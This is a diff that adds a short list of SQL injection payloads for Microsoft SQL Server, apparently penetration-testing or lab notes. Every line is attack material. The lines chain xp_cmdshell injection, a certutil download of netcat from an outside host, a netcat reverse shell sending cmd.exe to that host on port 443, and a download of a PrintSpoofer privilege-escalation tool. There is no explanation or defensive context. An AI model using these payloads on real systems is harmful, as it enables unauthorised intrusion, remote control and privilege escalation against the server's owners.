@@ -1,0 +1,9 @@
+'; EXEC xp_cmdshell 'ping 192.168.45.223' --
+
+'; EXEC xp_cmdshell 'mkdir c:\temp' --
+
+'; EXEC xp_cmdshell 'certutil.exe -urlcache -f http://192.168.45.173/win/nc.exe c:\temp\nc.exe' --
+
+'; EXEC xp_cmdshell 'c:\temp\nc.exe 192.168.45.173 443 -e cmd.exe' --
+
+certutil.exe -urlcache -f http://192.168.45.173/win/printspoofer64.exe c:\temp\printspoofer.exe
